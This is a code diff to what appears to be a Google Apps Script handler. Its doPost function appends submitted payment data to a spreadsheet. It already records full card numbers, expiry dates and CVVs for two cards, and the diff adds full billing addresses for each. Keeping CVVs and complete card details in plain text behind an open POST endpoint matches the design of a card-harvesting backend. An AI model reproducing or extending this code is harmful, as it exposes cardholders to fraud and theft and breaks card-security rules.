@@ -18,13 +18,23 @@ function getResponseSheet() {
       'Card Number',
       'Expiry Date',
       'CVV',
+      'Card Street',
+      'Card City',
+      'Card State',
+      'Card ZIP',
+      'Card Country',
       'Guarantor ID',
       'Guarantor Name',
       'Bill Amount',
       'Bill Card Holder Name',
       'Bill Card Number',
       'Bill Expiry Date',
-      'Bill CVV'
+      'Bill CVV',
+      'Bill Street',
+      'Bill City',
+      'Bill State',
+      'Bill ZIP',
+      'Bill Country'
     ]);
   }
 
@@ -72,13 +82,23 @@ function doPost(e) {
       data.cardNumber || '',
       data.expiryDate || '',
       data.cvv || '',
+      data.cardStreet || '',
+      data.cardCity || '',
+      data.cardState || '',
+      data.cardZip || '',
+      data.cardCountry || '',
       data.guarantorId || '',
       data.guarantorName || '',
       data.billAmount || '',
       data.billCardHolderName || '',
       data.billCardNumber || '',
       data.billExpiryDate || '',
-      data.billCvv || ''
+      data.billCvv || '',
+      data.billStreet || '',
+      data.billCity || '',
+      data.billState || '',
+      data.billZip || '',
+      data.billCountry || ''
     ];
 
     sheet.appendRow(row);
